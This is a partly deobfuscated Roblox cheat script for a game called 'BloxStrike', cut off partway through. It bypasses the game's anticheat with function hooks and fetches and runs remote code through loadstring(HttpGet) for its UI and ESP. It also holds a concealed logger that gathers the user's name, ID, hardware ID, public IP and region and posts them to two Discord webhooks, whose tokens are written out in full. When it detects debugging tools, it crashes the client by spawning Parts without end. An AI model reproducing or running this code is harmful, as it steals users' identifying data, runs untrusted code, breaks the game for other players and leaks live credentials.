-- Luraph runtime function (from the VM object, not part of the script: not lifted).
-- LPH_ENCFUNC decrypts a function this way: (key, encrypted buffer, ...) -> function.
local function luraph_runtime1(...)
	error("Luraph runtime function, not devirtualized")
end

debug.setupvalue(require(game:GetService("ReplicatedStorage").Components.Weapon).shoot, 5, {})
print("Bypass weapon data anticheat")
local v = getrenv()

if not isfunctionhooked(v.getfenv) then
	local v2 = nil

	local function fn(...)
		if debug.traceback():find("InventoryController") then
			return {}
		end
		return v2(...)
	end

	v2 = hookfunction
	v2 = v2(v.getfenv, fn)
end

print("Bypass env anticheat")
local v2 = game
local function fn(S)local C= v2 :GetService(S);if cloneref then return cloneref(C);end;return C;end
local wait = task.wait
local spawn = task.spawn
local date = os.date
local v3 = type
local v4 = hookfunction
local getDescendants = v2.GetDescendants
local findFirstChild = v2.FindFirstChild
local new = Instance.new
local localPlayer = fn("Players").LocalPlayer
local CoreGui = fn("CoreGui")
local Workspace = fn("Workspace")
local HttpService = fn("HttpService")
local UserInputService = fn("UserInputService")
local StarterGui = fn("StarterGui")
local function fn2(S,C,s)print(S,C);local d={Title=S,Text=tostring(C)};if s then d.Duration=s;end;pcall( StarterGui .SetCore, StarterGui ,"SendNotification",d);end

local function fn3(arg, arg2)
	local v5 = localPlayer
	local v6 = HttpService
	local v7 = UserInputService
	local MarketplaceService = fn("MarketplaceService")

	local function fn4()
		if v7.TouchEnabled and not v7.KeyboardEnabled then
			return "Mobile"
		end

		if v7.KeyboardEnabled then
			return "PC"
		end

		if v7.GamepadEnabled then
			return "Console"
		end
		return "Unknown"
	end

	local str, str2

	if identifyexecutor then
		str, str2 = identifyexecutor()
		str2 = str2 or "N/A"
	elseif syn then
		str = "Synapse X"
		str2 = "N/A"
	elseif KRNL_LOADED then
		str = "Krnl"
		str2 = "N/A"
	elseif fluxus then
		str = "Fluxus"
		str2 = "N/A"
	elseif is_sirhurt_closure then
		str = "SirHurt"
		str2 = "N/A"
	else
		str = "Unknown"
		str2 = "N/A"

		if OXYGEN then
			str = "Oxygen U"
		end
	end

	local str3 = "Unavailable"

	pcall(function()
		str3 = tostring(fn("RbxAnalyticsService"):GetClientId())
	end)

	local str4 = "Unknown"

	pcall(function()
		local productInfo = MarketplaceService:GetProductInfo(v2.PlaceId)

		if productInfo and productInfo.Name then
			str4 = productInfo.Name
		end
	end)

	local str5 = "Unknown"

	pcall(function()
		str5 = tostring(fn("LocalizationService"):GetCountryRegionForPlayerAsync(v5) or "Unknown")
	end)

	local str6 = "Unavailable"

	pcall(function()
		local response = v2:HttpGet("https://api.ipify.org")

		if response and response ~= "" then
			str6 = response
		end
	end)

	local str7 = "Unknown"
	local str8 = "Free"

	pcall(function()
		str7 = tostring(v5.AccountAge) .. " days"
		str8 = v5.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
	end)

	local tbl = {
		avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(v5.UserId) .. "&width=150&height=150&format=png",
		content = arg2 or "",
		username = "Roblox Logger",
	}

	local embeds = {}

	local tbl2 = {
		title = "Script Execution Report",
		color = 3447003,
		author = {
			name = v5.Name,
			icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(v5.UserId) .. "&width=150&height=150&format=png",
		},
		thumbnail = {
			url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(v5.UserId) .. "&width=420&height=420&format=png",
		},
	}

	local fields = {}

	local tbl3 = {
		name = "User Info",
		value = "Username: " .. v5.Name .. "\nUser ID: " .. v5.UserId .. "\nPlatform: " .. fn4(),
		inline = false,
	}

	local tbl4 = {
		name = "Executor Info",
		value = "Executor: " .. str .. "\nVersion: " .. str2 .. "\nHWID: " .. str3,
		inline = false,
	}

	local tbl5 = {
		name = "Game Info",
		value = "Game Name: " .. str4 .. "\nPlace ID: " .. v2.PlaceId .. "\nJob ID: " .. v2.JobId,
		inline = false,
	}

	fields[1] = tbl3
	fields[2] = tbl4
	fields[3] = tbl5
	fields[4] = { name = "Network Info", value = "IP Address: " .. str6 .. "\nRegion: " .. str5, inline = false }
	fields[5] = { name = "Account Info", value = "Account Age: " .. str7 .. "\nMembership: " .. str8, inline = false }
	tbl2.fields = fields
	tbl2.footer = { text = "User ID: " .. tostring(v5.UserId) }
	tbl2.timestamp = date("!%Y-%m-%dT%H:%M:%SZ")
	embeds[1] = tbl2
	tbl.embeds = embeds

	local ok, result = pcall(function()
		return v6:JSONEncode(tbl)
	end)

	if not ok then
		return
	end
	local request_ = syn and syn.request or request or http_request
	if not request_ then
		return
	end
	local v8 = request_({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })

	if v8 and v8.StatusCode ~= 200 and v8.StatusCode ~= 204 then
		print("Webhook error:", v8.StatusCode)
	end
end

local function fn4()
end

local function fn5()
end

local function fn6()
end

local v5 = luraph_runtime1(function()
end)

v4(fn4, v5)

local v6 = luraph_runtime1(function()
end)

v4(fn5, v6)

local v7 = luraph_runtime1(function()
end)

v4(fn6, v7)

spawn(function()
	local flag = false
	local str = ""

	while true do
		if SCRIPT_KEY == "D022048F29" then
			return
		else
			fn("LogService"):ClearOutput()

			if findFirstChild(CoreGui, "DevConsoleMaster") then
				str ..= "detected DevConsoleMaster "
				CoreGui.DevConsoleMaster:Destroy()
				flag = true
			end

			if dtspy or getgenv().CobaltInitialized or getgenv().SimpleSpyExecuted then
				str ..= "detected spy "
				flag = true
			end

			if not isfunctionhooked(fn4) or not isfunctionhooked(fn5) or not isfunctionhooked(fn6) then
				str ..= "hookmetamethod isfunctionhooked "
				flag = true
			end

			if isfunctionhooked(loadstring) then
				str ..= "hookmetamethod loadstring "
				flag = true
			end

			if isfunctionhooked(v2.HttpGet) then
				str ..= "hookmetamethod Game.HttpGet "
				flag = true
			end

			if isfunctionhooked(request) then
				str ..= "hookmetamethod request "
				flag = true
			end

			if isfunctionhooked(v2.HttpGet) then
				str ..= "hookmetamethod HttpGet "
				flag = true
			end

			if isfunctionhooked(getrawmetatable) then
				str ..= "hookmetamethod getrawmetatable "
				flag = true
			end

			if isfunctionhooked(localPlayer.Kick) then
				str ..= "hookmetamethod Kick "
				flag = true
			end

			if isfunctionhooked(HttpService.GetAsync) then
				str ..= "hookmetamethod GetAsync "
				flag = true
			end

			if isfunctionhooked(HttpService.JSONDecode) then
				str ..= "hookmetamethod JSONDecode "
				flag = true
			end

			if isfunctionhooked(localPlayer.IsInGroup) then
				str ..= "hookmetamethod IsInGroup "
				flag = true
			end

			if isfunctionhooked(HttpService.RequestAsync) then
				str ..= "hookmetamethod RequestAsync "
				flag = true
			end

			if isfunctionhooked(HttpService.PostAsync) then
				str ..= "hookmetamethod PostAsync "
				flag = true
			end

			if flag then
				break
			end
			wait(3)
		end
	end

	pcall(fn3, "https://discord.com/api/webhooks/1501722704871690392/lwlnk748HLcSVL2lpvDsVM5jHl1i3fUWaS0Z3wN3Lk4bvaaJOuqdAOIndARsvvXhqDgz", tostring(SCRIPT_KEY) .. " " .. str)
	wait(5)

	while true do
		pcall(function()
			for i = 1, 1000 do
				local v8 = next
				local v9, v10 = getDescendants(v2)

				for k in v8, v9, v10 do
					new("Part", Workspace)
				end
			end
		end)

		wait()
	end
end)

local tbl = { APPID = "22468", VERSION = "1.1", KEY = SCRIPT_KEY or "" }
tbl.HWID = fn("RbxAnalyticsService"):GetClientId()
tbl.NOTICE = ""
tbl.TOKEN = ""
tbl.kmlogon = "http://wy.llua.cn/api/?id=kmlogon&app=" .. tbl.APPID
tbl.notice = "http://wy.llua.cn/api/?id=notice&app=" .. tbl.APPID
tbl.heartbeat = "http://wy.llua.cn/api/?id=heartbeat&app=" .. tbl.APPID .. "&kami=" .. tbl.KEY .. "&markcode=" .. tbl.HWID .. "&token="
local v8 = HttpService

local ok, result = pcall(function()
	return request({ Url = tbl.kmlogon, Method = "GET" })
end)

if not ok then
	fn2("Version check failed", result)

	while true do
		wait()
	end
else
	local data = v8:JSONDecode(result.Body)

	if not data then
		fn2("Version check failed", "Failed to parse response data")

		while true do
			wait()
		end
	else
		local version = data.version
		local appUpdateShow = data.app_update_show or "A new version is available. Please update before use"
		local appUpdateUrl = data.app_update_url or ""

		if not version and v3(data.msg) == "table" then
			version = data.msg.version
		end

		if version and tostring(version) ~= tostring(tbl.VERSION) then
			local str

			if appUpdateUrl ~= "" then
				pcall(function()
					setclipboard(appUpdateUrl)
				end)

				str = appUpdateShow .. "\nDownload URL copied to clipboard"
			else
				str = appUpdateShow
			end

			fn2("Update required", str, 10)

			while true do
				wait()
			end
		else
			local ok2, result2 = pcall(function()
				return request({ Url = tbl.notice, Method = "GET" })
			end)

			if ok2 and result2 and result2.Body then
				local data2 = v8:JSONDecode(result2.Body)

				if data2 and tonumber(data2.code) == 200 then
					local msg = data2.msg
					local appGg

					if v3(msg) == "table" and msg.app_gg ~= nil then
						appGg = msg.app_gg
					else
						appGg = nil

						if data2.app_gg ~= nil then
							appGg = data2.app_gg
						end
					end

					if appGg ~= nil then
						tbl.NOTICE = appGg
					end
				end
			end

			local str = tbl.kmlogon .. "&kami=" .. tbl.KEY .. "&markcode=" .. tbl.HWID

			local ok3, result3 = pcall(function()
				return request({ Url = str, Method = "GET" })
			end)

			if ok3 then
				local data2 = v8:JSONDecode(result3.Body)

				if data2 then
					if data2.code == 200 and data2.msg and data2.msg.vip then
						fn2("Login Success", "Expire " .. date("%Y-%m-%d %H:%M:%S", data2.msg.vip))

						if data2.msg.token then
							tbl.TOKEN = data2.msg.token
						end
					elseif tostring(data2.msg) then
						fn2("Login Failed1", data2.msg)

						while true do
							wait()
						end
					end

					spawn(function()
						while true do
							wait(10)

							local ok4, result4 = pcall(function()
								return request({ Url = tbl.heartbeat .. tbl.TOKEN, Method = "GET" })
							end)

							if ok4 then
								local data3 = HttpService:JSONDecode(result4.Body)
								if not data3 then
									continue
								end

								if data3.code == 200 then
									continue
								end

								pcall(function()
									for i = 1, 1000 do
										local v9 = next
										local v10, v11 = getDescendants(v2)

										for k in v9, v10, v11 do
											new("Part", Workspace)
										end
									end
								end)
							end
						end
					end)

					spawn(fn3, "https://discord.com/api/webhooks/1501413669739958313/_uortqJa4RSs27Eb4STj9pElnkSJD4bAVb8F5hfclJPcUo29Q1755I6va7gwvpTCz8ji", SCRIPT_KEY)
					local tbl2 = { Running = true }
					local lib = loadstring(game:HttpGet("https://cnb.cool/MoonLua/Rayfiled/-/git/raw/main/gen2"))()
					local flags = nil
					local str2 = "en"
					local tbl3 = { Aimbot = "自瞄", TriggerBot = "扳机机器人", Enabled = "已开启", Disabled = "已关闭" }

					local function fn7(arg, arg2)
						if str2 == "zh-cn" and tbl3[arg] then
							return tbl3[arg]
						end
						return arg2 or arg
					end

					local tbl4 = {
						Players = game:GetService("Players"),
						ReplicatedStorage = game:GetService("ReplicatedStorage"),
						RunService = game:GetService("RunService"),
						CollectionService = game:GetService("CollectionService"),
						HttpService = game:GetService("HttpService"),
						TweenService = game:GetService("TweenService"),
						Debris = game:GetService("Debris"),
						UserInputService = game:GetService("UserInputService"),
						Workspace = game:GetService("Workspace"),
					}

					local localPlayer2 = tbl4.Players.LocalPlayer
					local replicatedStorage = tbl4.ReplicatedStorage
					local vfxLibary = replicatedStorage.Components.Common:FindFirstChild("VFXLibary")
					local v9 = nil

					local function fn8(arg)
						if not arg then
							return nil
						end
						local ok4, result4 = pcall(require, arg)
						return ok4 and result4 or nil
					end

					local tbl5 = {
						InputController = fn8(replicatedStorage.Controllers:FindFirstChild("InputController")),
						CharacterController = fn8(replicatedStorage.Controllers:FindFirstChild("CharacterController")),
						InventoryController = fn8(replicatedStorage.Controllers:FindFirstChild("InventoryController")),
						GameState = fn8(replicatedStorage.Database.Components:FindFirstChild("GameState")),
						Remotes = fn8(replicatedStorage.Database.Security:FindFirstChild("Remotes")),
						CameraController = fn8(replicatedStorage.Controllers:FindFirstChild("CameraController")),
						CharacterResolver = fn8(replicatedStorage.Components.Common:FindFirstChild("CharacterResolver")),
						IsPlayingTeam = fn8(replicatedStorage.Components.Common:FindFirstChild("IsPlayingTeam")),
						GetRayIgnore = fn8(replicatedStorage.Components.Common:FindFirstChild("GetRayIgnore")),
						CenterScreenRaycast = fn8(replicatedStorage.Components.Common:FindFirstChild("CenterScreenRaycast")),
						GetWeaponProperties = fn8(replicatedStorage.Components.Common:FindFirstChild("GetWeaponProperties")),
						CharacterPose = fn8(replicatedStorage.Components.Common:FindFirstChild("CharacterPose")),
						CommandStream = fn8(replicatedStorage.MovementV2.Client:FindFirstChild("CommandStream")),
						RuntimeKinematics = fn8(replicatedStorage.MovementV2:FindFirstChild("RuntimeKinematics")),
						GrenadeSimulator = fn8(replicatedStorage.Shared:FindFirstChild("GrenadeSimulator")),
						Raycast = fn8(replicatedStorage.Shared:FindFirstChild("Raycast")),
					}

					tbl5.FlashEffect = fn8(vfxLibary and vfxLibary:FindFirstChild("FlashEffect"))
					tbl5.CreateVoxelSmoke = fn8(vfxLibary and vfxLibary:FindFirstChild("CreateVoxelSmoke"))
					tbl5.Weapon = fn8(replicatedStorage.Components:FindFirstChild("Weapon"))
					tbl5.Bullet = fn8(replicatedStorage.Components.Weapon.Classes:FindFirstChild("Bullet"))
					tbl5.Character = fn8(replicatedStorage.Classes:FindFirstChild("Character"))

					local function fn9(arg)
						return flags ~= nil and flags[arg] == true
					end

					local function fn10(arg)
						local tbl6 = {}

						if type(tbl5.GetRayIgnore) == "function" then
							local ok4, result4 = pcall(tbl5.GetRayIgnore)

							if ok4 and type(result4) == "table" then
								tbl6 = table.clone(result4)
							end
						end

						local v10 = ipairs
						arg = arg or {}

						for _, v11 in v10(arg) do
							if typeof(v11) == "Instance" and not table.find(tbl6, v11) then
								tbl6[#tbl6 + 1] = v11
							end
						end

						return tbl6
					end

					local function fn11(arg, arg2)
						local v10 = flags[arg]
						return type(v10) == "number" and v10 or arg2
					end

					local function fn12(arg, arg2)
						local v10 = flags[arg]
						if type(v10) == "string" then
							return v10
						end

						if type(v10) == "table" and type(v10[1]) == "string" then
							return v10[1]
						end
						return arg2
					end

					local function fn13(arg, arg2)
						local v10 = flags[arg]
						if type(v10) == "table" and typeof(v10.Color) == "Color3" then
							return v10.Color
						end
						return typeof(v10) == "Color3" and v10 or arg2
					end

					local function fn14(arg, arg2)
						local v10 = flags[arg]
						if type(v10) == "table" then
							return v10
						end
						return v10 == nil and arg2 or {}
					end

					local function fn15(arg, arg2, arg3)
						local v10 = pairs
						local v11 = table.pack(fn14(arg, arg3))
						v11.n = 1 + v11.n - 1
						table.move(v11, 1, v11.n, 1, v11)

						for k, v12 in v10(table.unpack(v11, 1, v11.n)) do
							if v12 == arg2 or k == arg2 and v12 == true then
								return true
							end
						end

						return false
					end

					local function fn16(arg, arg2)
						return next(fn14(arg, arg2)) ~= nil
					end

					local function fn17(arg)
						return arg
					end

					local function fn18(arg, arg2)
						local v10 = Drawing.new(arg)
						local v11 = pairs
						arg2 = arg2 or {}

						for k, v12 in v11(arg2) do
							v10[k] = v12
						end

						return v10
					end

					local function createHighlight()
						local highlight = Instance.new("Highlight")
						highlight.Name = "BloxStrikeESPHighlight"
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.55
						highlight.OutlineTransparency = 0
						highlight.Enabled = false
						return highlight
					end

					local function fn19(arg, arg2, arg3)
						tbl4.RunService:BindToRenderStep(arg, arg2, arg3)
					end

					local function fn20()
						if not tbl5.CharacterController then
							return nil
						end
						local ok4, result4 = pcall(tbl5.CharacterController.getCurrentCharacter)
						if not ok4 or type(result4) ~= "table" then
							return nil
						end

						if result4.IsDestroyed == true or typeof(result4.Character) ~= "Instance" or result4.Character.Parent == nil then
							return nil
						end
						return result4
					end

					local function fn21()
						local v10 = fn20()
						if v10 and typeof(v10.Character) == "Instance" then
							return v10.Character
						end

						if tbl5.CharacterResolver then
							local ok4, result4 = pcall(tbl5.CharacterResolver.getLocalCharacter)
							if ok4 then
								return result4
							end
						end

						return nil
					end

					local function fn22(arg)
						if type(arg) == "table" then
							return arg
						end

						if type(arg) ~= "string" or arg == "" then
							return nil
						end
						local ok4, result4 = pcall(tbl4.HttpService.JSONDecode, tbl4.HttpService, arg)
						return ok4 and type(result4) == "table" and result4 or nil
					end

					local function fn23(arg, arg2)
						local name = fn22(arg:GetAttribute(arg2))

						if name then
							name = name.Name or name.Weapon
						end

						return name or nil
					end

					local function fn24(arg)
						if tbl5.CharacterResolver then
							local ok4, result4 = pcall(tbl5.CharacterResolver.getPlayerCharacter, arg)
							if ok4 and typeof(result4) == "Instance" then
								return result4
							end
						end

						local characters = tbl4.Workspace:FindFirstChild("Characters")
						return characters and characters:FindFirstChild(arg.Name, true) or nil
					end

					local function fn25(arg, arg2)
						if not arg2 or not arg2.Parent or not arg2.PrimaryPart then
							return false
						end

						if arg:GetAttribute("Dead") == true or arg2:GetAttribute("Dead") == true then
							return false
						end
						local attribute = arg2:GetAttribute("Health")
						return type(attribute) ~= "number" or attribute > 0
					end

					local function fn26(arg)
						if type(tbl5.IsPlayingTeam) == "function" then
							local ok4, result4 = pcall(tbl5.IsPlayingTeam, arg)
							if ok4 then
								return result4 == true
							end
						end

						return arg == "Terrorists" or arg == "Counter-Terrorists"
					end

					local function fn27(arg)
						return arg ~= nil and fn26(arg:GetAttribute("Team"))
					end

					local function fn28()
						return tbl4.Workspace:GetAttribute("Gamemode") == "Deathmatch"
					end

					local function fn29(arg)
						if arg == localPlayer2 or not fn27(arg) or not fn27(localPlayer2) then
							return false
						end

						if fn28() then
							return true
						end
						return localPlayer2:GetAttribute("Team") ~= arg:GetAttribute("Team")
					end

					local function fn30(arg, arg2)
						if type(getthreadidentity) ~= "function" or type(setthreadidentity) ~= "function" then
							return arg2()
						end
						local ok4, result4 = pcall(getthreadidentity)
						if not ok4 or result4 == arg then
							return arg2()
						end

						if not pcall(setthreadidentity, arg) then
							return arg2()
						end
						local ok5, result5 = pcall(arg2)
						pcall(setthreadidentity, result4)

						if not ok5 then
							error(result5, 0)
						end

						return result5
					end

					local function fn31()
						local v10 = _G

						if type(getgenv) == "function" then
							local ok4, result4 = pcall(getgenv)

							if ok4 and type(result4) == "table" then
								v10 = result4
							end
						end

						local robloxESP = v10.RobloxESP

						if type(robloxESP) == "table" and type(robloxESP.Destroy) == "function" then
							pcall(robloxESP.Destroy, robloxESP, false)
						end

						local moonEspLibraryUrl = type(v10.MoonEspLibraryUrl) == "string" and v10.MoonEspLibraryUrl ~= "" and v10.MoonEspLibraryUrl or "https://cnb.cool/MoonLua/ESP/-/git/raw/main/1"

						local ok4, robloxESP2 = pcall(function()
							local response = game:HttpGet(moonEspLibraryUrl)

							if type(response) == "string" and response:find("function a1", 1, true) and response:find("local dim2=f", 1, true) then
								response = "local dim2 = UDim2.new\n" .. response
							end

							local chunk = loadstring(response, "@BloxStrikeESP")
							return type(chunk) == "function" and chunk() or nil
						end)

						if not ok4 or type(robloxESP2) ~= "table" or type(robloxESP2.Override) ~= "function" then
							return
						end

						if type(robloxESP2.GetCharacter) ~= "function" then
							robloxESP2.GetCharacter = function(arg)
								return arg and arg.Character
							end
						end

						v9 = robloxESP2
						v10.RobloxESP = robloxESP2

						robloxESP2:Override({
							CreateInstance = function(arg)
								return fn30(2, function()
									return Instance.new(arg)
								end)
							end,
							GetCharacter = fn24,
							GetCharacterParts = function(arg)
								if not fn27(arg) then
									return nil
								end
								local v11 = fn24(arg)
								if not fn25(arg, v11) then
									return nil
								end
								local humanoid = v11:FindFirstChildOfClass("Humanoid")
								local primaryPart = v11.PrimaryPart or v11:FindFirstChild("HumanoidRootPart")
								if not primaryPart then
									return nil
								end
								return v11, humanoid, primaryPart, v11:FindFirstChild("Head")
							end,
							GetHealth = function(arg)
								local attribute = arg and arg:GetAttribute("Health")
								arg = arg and arg:GetAttribute("MaxHealth")
								return type(attribute) == "number" and attribute or nil, type(arg) == "number" and arg or nil
							end,
							IsCharacterAlive = function(arg, arg2)
								return fn25(arg, arg2)
							end,
							GetTool = function(arg, arg2)
								return fn23(arg2, "CurrentEquipped") or ""
							end,
							GetPriority = function(arg)
								if arg == localPlayer2 then
									return "Friendly"
								end

								if not fn27(arg) or not fn27(localPlayer2) then
									return "Neutral"
								end
								return fn29(arg) and "Enemy" or "Friendly"
							end,
						})

						robloxESP2:SetConfigSync(function(arg)
							local config = arg.Config
							local bloxStrikeEspTextSize = fn11("BloxStrike ESP Text Size", 14)
							local tbl6 = { "Name", "Distance", "Model", "Weapon", "Grenade", "C4", "Health", "HealthBar" }
							config.Enabled = fn16("BloxStrike Player ESP Elements", tbl6)
							config.MaxDistance = fn11("BloxStrike Player ESP Distance", 3000)
							config.Name = fn15("BloxStrike Player ESP Elements", "Name", tbl6)
							config.Distance = fn15("BloxStrike Player ESP Elements", "Distance", tbl6)
							config.Tool = false
							config.Health = fn15("BloxStrike Player ESP Elements", "Health", tbl6)
							config.HealthBar = fn15("BloxStrike Player ESP Elements", "HealthBar", tbl6)
							config.Flags = false
							config.Boxes = false
							config.Chams = fn15("BloxStrike Player ESP Elements", "Model", tbl6)
							config.ChamsOutline = config.Chams
							config.ChamsInline = config.Chams
							config.OnlyEnemy = true
							config.TextColor = fn13("BloxStrike ESP Text Color", Color3.new(1, 1, 1))
							config.ChamsOutlineColor = fn13("BloxStrike ESP Chams Outline Color", Color3.fromRGB(255, 255, 255))
							config.ChamsInlineColor = fn13("BloxStrike ESP Chams Fill Color", Color3.fromRGB(128, 128, 255))
							config.TextSize = bloxStrikeEspTextSize
							config.MinTextSize = bloxStrikeEspTextSize
						end)

						fn30(2, function()
							robloxESP2:Start()
						end)
					end

					local function fn32(arg)
						local currentCamera = tbl4.Workspace.CurrentCamera
						if not currentCamera then
							return nil, false
						end
						local v10, v11 = currentCamera:WorldToViewportPoint(arg)
						return Vector2.new(v10.X, v10.Y), v11 and v10.Z > 0
					end

					local function fn33()
						local tbl6 = {}
						local tbl7 = {}
						local tbl8 = {}
						local tbl9 = {}
						local tbl10 = {}
						local tbl11 = {}
						local n = 0
						local n2 = 0
						local v10 = nil
						local tbl12 = { Updated = 0, Interval = 0.05 }
						local tbl13 = {}
						local tbl14 = nil
						local v11 = nil
						local v12 = nil

						local tbl15 = {
							Obelus = {
								Texture = "rbxassetid://2382169232",
								Brightness = 1.5,
								Transparency = NumberSequence.new(0.45),
								LightEmission = 1,
								LightInfluence = 0,
								Segments = 1,
								TextureLength = 5,
								TextureMode = Enum.TextureMode.Stretch,
								TextureSpeed = 0,
								Width0 = 0.3,
								Width1 = 0.3,
								FaceCamera = true,
							},
							Lightning = {
								Texture = "rbxassetid://7151778302",
								Brightness = 1.5,
								Transparency = NumberSequence.new(0.45),
								LightEmission = 1,
								LightInfluence = 0,
								Segments = 10,
								TextureLength = 1,
								TextureMode = Enum.TextureMode.Stretch,
								TextureSpeed = 1,
								Width0 = 1.2,
								Width1 = 1.2,
								FaceCamera = true,
							},
							DNA = {
								Texture = "rbxassetid://7071778278",
								Brightness = 1.5,
								Transparency = NumberSequence.new(0.45),
								LightEmission = 1,
								LightInfluence = 0,
								Segments = 1,
								TextureLength = 12,
								TextureMode = Enum.TextureMode.Wrap,
								TextureSpeed = 1,
								Width0 = 0.6,
								Width1 = 0.6,
								FaceCamera = true,
							},
						}

						local screenGui = Instance.new("ScreenGui")
						screenGui.Name = "BloxStrikeESPText"
						screenGui.IgnoreGuiInset = true
						screenGui.ResetOnSpawn = false
						screenGui.DisplayOrder = 11
						screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
						screenGui.Parent = localPlayer2:WaitForChild("PlayerGui")

						local function createTextLabel()
							local textLabel = Instance.new("TextLabel")
							textLabel.Name = "BloxStrikeESPTextLabel"
							textLabel.BackgroundTransparency = 1
							textLabel.BorderSizePixel = 0
							textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
							textLabel.AutomaticSize = Enum.AutomaticSize.XY
							textLabel.Size = UDim2.fromOffset(0, 0)
							textLabel.Font = Enum.Font.SourceSans
							textLabel.TextSize = 14
							textLabel.TextColor3 = Color3.new(1, 1, 1)
							textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
							textLabel.TextStrokeTransparency = 0
							textLabel.TextXAlignment = Enum.TextXAlignment.Center
							textLabel.TextYAlignment = Enum.TextYAlignment.Center
							textLabel.TextWrapped = false
							textLabel.Visible = false
							textLabel.Parent = screenGui
							return textLabel
						end

						local function fn34(arg)
							local ok4, result4 = pcall(function()
								return fn30(2, function()
									return Instance.new(arg)
								end)
							end)

							return ok4 and result4 or nil
						end

						local function fn35(arg)
							local tbl16 = {
								Local = Color3.fromRGB(100, 95, 245),
								Team = Color3.fromRGB(255, 200, 150),
								Enemy = Color3.fromRGB(255, 50, 80),
							}

							return fn13("BloxStrike Bullet Tracer " .. (arg or "Local") .. " Color", tbl16[arg] or tbl16.Local)
						end

						local function fn36(arg, arg2)
							local obelus = tbl15[fn12("BloxStrike Bullet Tracer Texture", "Obelus")] or tbl15.Obelus

							for k, obelu in pairs(obelus) do
								pcall(function()
									arg[k] = obelu
								end)
							end

							local v13 = fn35(arg2)

							pcall(function()
								arg.Color = ColorSequence.new(v13)
							end)
						end

						local function fn37()
							if v11 and v11.Parent then
								return v11
							end
							local terrain = tbl4.Workspace.Terrain
							if not terrain then
								return nil
							end
							local Beam = fn34("Beam")
							if not Beam then
								return nil
							end
							Beam.Name = "BloxStrikeBulletTracerTemplate"
							Beam.Parent = terrain
							v11 = Beam
							return Beam
						end

						local function fn38(arg, arg2, arg3)
							if not fn9("BloxStrike Bullet Tracer") then
								return
							end
							local str3 = arg3 == "Team" and "Team" or arg3 == "Enemy" and "Enemy" or "Local"
							if typeof(arg) ~= "Vector3" or typeof(arg2) ~= "Vector3" then
								return
							end

							if (arg2 - arg).Magnitude < 0.05 then
								return
							end
							local v13 = fn37()
							local terrain = tbl4.Workspace.Terrain
							if not v13 or not terrain then
								return
							end

							local ok4, result4 = pcall(function()
								return fn30(2, function()
									return v13:Clone()
								end)
							end)

							if not ok4 or not result4 then
								return
							end
							local Attachment = fn34("Attachment")
							local Attachment2 = fn34("Attachment")

							if not Attachment or not Attachment2 then
								if Attachment then
									Attachment:Destroy()
								end

								if Attachment2 then
									Attachment2:Destroy()
								end

								result4:Destroy()
								return
							end

							fn36(result4, str3)
							Attachment.WorldCFrame = CFrame.new(arg)
							Attachment2.WorldCFrame = CFrame.new(arg2)
							Attachment.Parent = terrain
							Attachment2.Parent = terrain
							result4.Attachment0 = Attachment
							result4.Attachment1 = Attachment2
							result4.Parent = terrain

							task.delay(math.max(fn11("BloxStrike Bullet Tracer Lifetime", 2), 0.1), function()
								for i = 0, 1, 0.03 do
									if result4.Parent then
										pcall(function()
											result4.Transparency = NumberSequence.new(i)
										end)

										task.wait()
										continue
									end

									break
								end

								if Attachment.Parent then
									Attachment:Destroy()
								end

								if Attachment2.Parent then
									Attachment2:Destroy()
								end

								if result4.Parent then
									result4:Destroy()
								end
							end)
						end

						local function fn39()
							if v12 and v12.Parent then
								return v12
							end
							local terrain = tbl4.Workspace.Terrain
							if not terrain then
								return nil
							end
							local Part = fn34("Part")
							local BoxHandleAdornment = fn34("BoxHandleAdornment")

							if not Part or not BoxHandleAdornment then
								if Part then
									Part:Destroy()
								end

								if BoxHandleAdornment then
									BoxHandleAdornment:Destroy()
								end

								return nil
							end

							Part.Name = "BloxStrikeBulletImpactTemplate"
							Part.Material = Enum.Material.ForceField
							Part.Size = Vector3.new(0.35, 0.35, 0.35)
							Part.Transparency = 1
							Part.Anchored = true
							Part.CanCollide = false
							Part.CanQuery = false
							Part.CanTouch = false
							BoxHandleAdornment.Adornee = Part
							BoxHandleAdornment.AlwaysOnTop = true
							BoxHandleAdornment.AdornCullingMode = Enum.AdornCullingMode.Never
							BoxHandleAdornment.Size = Part.Size * 1.1
							BoxHandleAdornment.Transparency = 0.3
							BoxHandleAdornment.ZIndex = 1
							BoxHandleAdornment.Parent = Part
							Part.Parent = terrain
							v12 = Part
							return Part
						end

						local function fn40(arg, arg2)
							if not fn9("BloxStrike Bullet Impacts") or typeof(arg) ~= "Vector3" then
								return
							end

							if typeof(arg2) ~= "Vector3" or arg2.Magnitude < 0.01 then
								arg2 = Vector3.new(0, 1, 0)
							end

							local v13 = fn39()
							local terrain = tbl4.Workspace.Terrain
							if not v13 or not terrain then
								return
							end

							local ok4, result4 = pcall(function()
								return fn30(2, function()
									return v13:Clone()
								end)
							end)

							if not ok4 or not result4 then
								return
							end
							local bloxStrikeBulletImpactsColor = fn13("BloxStrike Bullet Impacts Color", Color3.fromRGB(100, 95, 245))
							result4.Color = bloxStrikeBulletImpactsColor
							result4.CFrame = CFrame.new(arg, arg + arg2.Unit)
							local boxHandleAdornment = result4:FindFirstChildOfClass("BoxHandleAdornment")

							if boxHandleAdornment then
								boxHandleAdornment.Color3 = bloxStrikeBulletImpactsColor
							end

							result4.Transparency = 0
							result4.Parent = terrain

							task.delay(math.max(fn11("BloxStrike Bullet Tracer Lifetime", 2), 0.1), function()
								for i = 0, 1, 0.03 do
									if result4.Parent then
										result4.Transparency = i
										task.wait()
										continue
									end

									break
								end

								if result4.Parent then
									result4:Destroy()
								end
							end)
						end

						local function fn41(arg)
							if not fn9("BloxStrike Hit Mark") or typeof(arg) ~= "Vector3" then
								return
							end
							local terrain = tbl4.Workspace.Terrain
							if not terrain then
								return
							end
							local Part = fn34("Part")
							local BillboardGui = fn34("BillboardGui")

							if not Part or not BillboardGui then
								if Part then
									Part:Destroy()
								end

								if BillboardGui then
									BillboardGui:Destroy()
								end

								return
							end

							Part.Name = "BloxStrikeHitMark"
							Part.Size = Vector3.new(0.2, 0.2, 0.2)
							Part.Transparency = 1
